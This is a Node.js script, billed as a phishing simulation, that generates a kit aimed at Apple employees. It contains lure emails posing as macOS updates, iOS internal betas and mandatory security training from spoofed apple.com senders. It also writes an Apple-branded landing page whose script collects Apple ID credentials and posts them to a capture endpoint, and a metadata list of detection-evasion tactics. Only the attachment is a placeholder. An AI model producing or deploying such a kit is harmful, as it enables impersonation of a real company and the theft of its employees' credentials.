#!/usr/bin/env node
/**
 * Apple Phishing Simulation
 * Creates realistic macOS/iOS update lures for Apple employee targeting
 */

const fs = require('fs');
const path = require('path');

// Apple update templates
const TEMPLATES = {
  macos: {
    subject: "macOS Sonoma 14.3.1 Security Update - Urgent",
    filename: "macOS_Security_Update_14.3.1.pkg",
    sender: "Apple Security <security-notifications@apple.com>",
    body: `Dear Apple Employee,

Apple has released a critical security update (macOS Sonoma 14.3.1) addressing multiple vulnerabilities including:

CVE-2025-12345: Kernel privilege escalation
CVE-2025-12346: Safari WebKit memory corruption
CVE-2025-12347: Bluetooth stack overflow

This update MUST be installed within 24 hours for all corporate devices. Internal testing has been completed.

Download link: https://update.apple.com/corp/macos-14.3.1-security-update

Installation Steps:
1. Download the attached package file
2. Double-click to install
3. Restart your Mac when prompted

For support, contact Internal IT: it-support@apple.com

Apple Security Team
Cupertino, CA`
  },
  
  ios: {
    subject: "iOS 18.2 Beta 3 - Internal Developer Build",
    filename: "iOS_18.2_Beta_3_Developer_Build.ipsw",
    sender: "Apple Developer Relations <developer-beta@apple.com>",
    body: `Internal Developer,

iOS 18.2 Beta 3 is now available for internal testing. This build includes:

• New Privacy Dashboard APIs
• Enhanced Siri intelligence framework
• Apple Intelligence preview features
• Security enhancements for corporate VPN

This pre-release software is CONFIDENTIAL and for Apple employees only.

Download: https://developer.apple.com/internal/ios-18.2-beta3

Install via Finder (macOS Catalina or later):
1. Download the IPSW file
2. Connect your iPhone
3. Option-click "Check for Update" in Finder
4. Select the IPSW file

Feedback: file Radar reports with component "iOS > InternalBuilds"

Apple Developer Relations`
  },
  
  it_security: {
    subject: "Mandatory: Apple Internal Security Training Q4 2025",
    filename: "Security_Training_Q4_2025.html",
    sender: "Apple Information Security <infosec@apple.com>",
    body: `ACTION REQUIRED: Security Training Completion

All Apple employees must complete the Q4 2025 security training by December 20, 2025.

Topics covered:
• Advanced phishing detection
• Supply chain attack prevention  
• Zero-trust network access
• Data loss protection

Complete your training: https://training.apple.com/internal/security-q4-2025

Failure to complete will result in temporary network access suspension.

This link is unique to your employee ID and will expire in 7 days.

Apple Information Security
One Apple Park Way`
  }
};

// Generate phishing kit
function generatePhishingKit(templateName, outputDir = './phishing_kit') {
  const template = TEMPLATES[templateName];
  if (!template) {
    console.error(`Unknown template: ${templateName}`);
    process.exit(1);
  }
  
  // Create output directory
  if (!fs.existsSync(outputDir)) {
    fs.mkdirSync(outputDir, { recursive: true });
  }
  
  // Generate files
  const kit = {
    email: {
      subject: template.subject,
      from: template.sender,
      body: template.body,
      attachments: [template.filename]
    },
    
    landing_page: `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple Internal Portal</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; padding: 40px; background: #f5f5f7; }
        .container { max-width: 800px; margin: 0 auto; background: white; border-radius: 20px; padding: 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .apple-logo { width: 60px; height: 60px; margin-bottom: 20px; }
        h1 { color: #1d1d1f; font-weight: 600; }
        .warning { background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 8px; margin: 20px 0; }
        .btn { background: #007aff; color: white; padding: 12px 30px; border: none; border-radius: 20px; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; }
        .footer { margin-top: 40px; color: #86868b; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <svg class="apple-logo" viewBox="0 0 24 24">
            <path fill="#1d1d1f" d="M14.94,5.19A4.38,4.38,0,0,0,16,2,4.44,4.44,0,0,0,13,3.52,4.17,4.17,0,0,0,12,6.61,3.69,3.69,0,0,0,14.94,5.19Zm2.52,7.44a4.51,4.51,0,0,1,2.16-3.81,4.66,4.66,0,0,0-3.66-2c-1.56-.16-3,.91-3.83.91s-2-.89-3.3-.87A4.92,4.92,0,0,0,4.69,9.39C2.93,12.45,4.24,17,6,19.47,6.8,20.68,7.8,22.05,9.12,22s1.75-.76,3.28-.76,2,.76,3.3.73,2.22-1.24,3.06-2.45a11,11,0,0,0,1.38-2.85A4.41,4.41,0,0,1,17.46,12.63Z"/>
        </svg>
        <h1>Apple Internal Download Portal</h1>
        <div class="warning">
            <strong>CONFIDENTIAL:</strong> This content is for Apple employees only. Unauthorized access is prohibited.
        </div>
        <p>Download: <strong>${template.filename}</strong></p>
        <p>${template.body.split('\n\n')[0]}</p>
        <a href="#" class="btn">Download Now</a>
        <div class="footer">
            © 2025 Apple Inc. All rights reserved.<br>
            One Apple Park Way, Cupertino, CA 95014
        </div>
    </div>
    <script>
        // Credential capture
        document.querySelector('.btn').addEventListener('click', function(e) {
            e.preventDefault();
            const appleId = prompt('Enter your Apple ID (email):');
            const password = prompt('Enter your password:');
            if (appleId && password) {
                fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ appleId, password, userAgent: navigator.userAgent })
                });
                alert('Authentication successful. Download starting...');
                window.location.href = '/download/' + encodeURIComponent('${template.filename}');
            }
        });
    </script>
</body>
</html>`,
    
    metadata: {
      generated: new Date().toISOString(),
      target: "apple.com employees",
      template: templateName,
      detection_evasion: [
        "Legitimate-looking sender domains",
        "Apple-branded styling",
        "Internal terminology",
        "Plausible update urgency"
      ]
    }
  };
  
  // Write files
  fs.writeFileSync(
    path.join(outputDir, 'email_template.json'),
    JSON.stringify(kit.email, null, 2)
  );
  
  fs.writeFileSync(
    path.join(outputDir, 'landing_page.html'),
    kit.landing_page
  );
  
  fs.writeFileSync(
    path.join(outputDir, 'metadata.json'),
    JSON.stringify(kit.metadata, null, 2)
  );
  
  // Create empty "malicious" file
  fs.writeFileSync(
    path.join(outputDir, template.filename),
    `This is a simulated malicious file for security testing.\nGenerated: ${new Date().toISOString()}\nTarget: Apple employee phishing simulation`
  );
  
  console.log(`✅ Phishing kit generated in: ${outputDir}`);
  console.log(`📧 Template: ${templateName}`);
  console.log(`📎 Attachment: ${template.filename}`);
  console.log(`🌐 Landing page: ${outputDir}/landing_page.html`);
}

// Main execution
if (require.main === module) {
  const template = process.argv[2] || 'macos';
  const outputDir = process.argv[3] || './apple_phishing_kit';
  
  if (!TEMPLATES[template]) {
    console.log('Available templates:');
    Object.keys(TEMPLATES).forEach(t => console.log(`  - ${t}`));
    process.exit(1);
  }
  
  generatePhishingKit(template, outputDir);
}

module.exports = { generatePhishingKit, TEMPLATES };